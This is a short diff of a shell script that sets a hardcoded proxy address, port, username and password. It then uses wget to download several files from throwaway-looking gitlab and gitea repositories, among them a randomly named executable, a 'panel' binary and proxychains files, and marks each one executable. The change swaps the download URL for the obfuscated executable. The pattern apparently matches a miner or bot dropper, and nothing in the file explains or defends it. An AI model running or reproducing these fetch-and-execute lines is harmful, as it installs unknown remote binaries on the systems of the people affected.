@@ -2,7 +2,7 @@ proxy="50.17.160.202"
 port="9293" 
 user="j20xdk29m7l3e1"  
 pass="iaukjmybb5yx5ot6vodovssxeb5" 
-wget -q -O xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc https://gitlab.com/node.js2594450/ruby9/-/raw/main/vds && chmod +x xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc
+wget -q -O xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc https://gitlab.com/node.js25944509/ruby9/-/raw/main/vds && chmod +x xnAnH5EYCjas2bd8JB9ADcceM2F96dTwhqonHtEPFNbbLaz7nc
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
